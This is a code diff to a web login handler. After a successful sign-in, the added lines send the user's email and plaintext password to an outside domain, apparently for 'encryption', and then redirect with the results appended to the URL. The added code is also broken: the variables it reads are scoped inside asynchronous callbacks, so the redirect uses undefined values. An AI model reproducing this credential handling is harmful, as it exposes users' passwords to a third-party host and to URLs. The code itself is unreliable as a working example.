@@ -518,8 +518,51 @@
 		            var data= JSON.stringify(success)
 		            //window.location.replace("./index.html")
                     //document.write("Login Successful!")
-                    bunnify1(userSIEmail);
-                    bunnify2(userSIPassword);
+                    var myHeaders = new Headers();
+                    myHeaders.append("Content-Type", "application/json");
+                    myHeaders.append("Accept", "application/json, /;q=0.5");
+
+                    var raw = JSON.stringify({
+                      "stringtoencrypt": `${userSIEmail}`
+                    });
+                    //document.write(raw)
+                    var requestOptions = {
+                      method: 'POST',
+                      headers: myHeaders,
+                      body: raw,
+                      redirect: 'follow'
+                    };
+
+                    fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
+                      .then(function (response) {
+                          return response.json();
+                      })
+                      .then(function (data) {
+                        var bunny1 = JSON.stringify(data);
+                })
+                    var myHeaders = new Headers();
+                    myHeaders.append("Content-Type", "application/json");
+                    myHeaders.append("Accept", "application/json, /;q=0.5");
+
+                    var raw = JSON.stringify({
+                      "stringtoencrypt": `${userSIPassword}`
+                    });
+                    //document.write(raw)
+                    var requestOptions = {
+                      method: 'POST',
+                      headers: myHeaders,
+                      body: raw,
+                      redirect: 'follow'
+                    };
+
+                    fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
+                      .then(function (response) {
+                          return response.json();
+                      })
+                      .then(function (data) {
+                        var bunny2 = JSON.stringify(data);
+                })
+
                     location.href=redirect +bunny1.encryptedstring + bunny2.encryptedstring
 
 		        }).catch((error) => {
@@ -550,8 +593,7 @@ function bunnify1(bunnytype) {
                   return response.json();
               })
               .then(function (data) {
-                bunny1 = JSON.stringify(data);
-                return bunny1
+                var bunny1 = JSON.stringify(data);
         })
 }
 function bunnify2(bunnytype) {
@@ -572,7 +614,7 @@ function bunnify2(bunnytype) {
 
             fetch("https://americanrivergold.com/fluffybunnyin", requestOptions)
               .then(function (response) {
-                  return response.json();
+                return response.json();
               })
               .then(function (data) {
                 bunny2 = JSON.stringify(data);
